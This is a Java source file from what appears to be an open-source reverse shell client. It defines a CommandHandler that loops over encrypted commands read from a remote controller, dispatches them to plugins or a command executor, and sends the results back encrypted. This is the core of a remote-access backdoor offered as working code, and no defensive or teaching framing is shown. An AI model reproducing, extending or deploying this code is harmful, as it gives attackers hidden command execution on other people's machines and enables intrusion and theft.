package obs1d1anc1ph3r.reverseshell.client.commandhandling;

import obs1d1anc1ph3r.reverseshell.client.plugins.PluginManager;
import java.io.*;
import obs1d1anc1ph3r.reverseshell.client.responsehandling.ResponseSender;
import obs1d1anc1ph3r.reverseshell.client.plugins.CommandPlugin;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class CommandHandler {

	private final PluginManager pluginManager;
	private final CommandExecutor commandExecutor;
	private final CommandReader commandReader;
	private final ResponseSender responseSender;
	private final StreamHandler streamHandler;

	private String command;

	public CommandHandler(StreamHandler streamHandler, PluginManager pluginManager) {
		this.pluginManager = pluginManager;
		this.commandExecutor = new CommandExecutor();
		byte[] encryptionKey = streamHandler.getEncryptionKey();

		this.streamHandler = streamHandler;
		this.commandReader = new CommandReader(streamHandler, encryptionKey);
		this.responseSender = new ResponseSender(streamHandler, encryptionKey);
	}

	//Handle commands here
	public void handleCommands() throws IOException, Exception {
		while (streamHandler.getIsOn()) {

			//Read the command
			command = commandReader.readCommand();

			//Split the command stuff
			String[] commandParts = command.split(" ", 2);
			String commandName = commandParts[0].toLowerCase();
			//If the command starts with a plugin, get it
			CommandPlugin plugin = pluginManager.getPlugin(commandName);

			if (plugin != null) {
				// Plugin found, execute it
				String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[0]);

				if (response == null || response.isEmpty()) {
					break;
				}

			} else {
				String response = commandExecutor.executeCommand(command);
				responseSender.sendEncryptedResponse(response);
			}

		}
	}

	public boolean getPlugin(String command) {
		//Split the command stuff
		String[] commandParts = command.split(" ", 2);
		String commandName = commandParts[0].toLowerCase();
		//If the command starts with a plugin, get it
		CommandPlugin plugin = pluginManager.getPlugin(commandName);

		executePlugin(plugin, command.split(" ", 2));

		return true;

	}

	public void executePlugin(CommandPlugin plugin, String[] commandParts) {
		String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[0]);

		if (response == null || response.isEmpty()) {
			streamHandler.turnOff();
		}
	}

	public CommandReader getCommandReader() {
		return commandReader;
	}

	public ResponseSender getResponseSender() {
		return responseSender;
	}

}
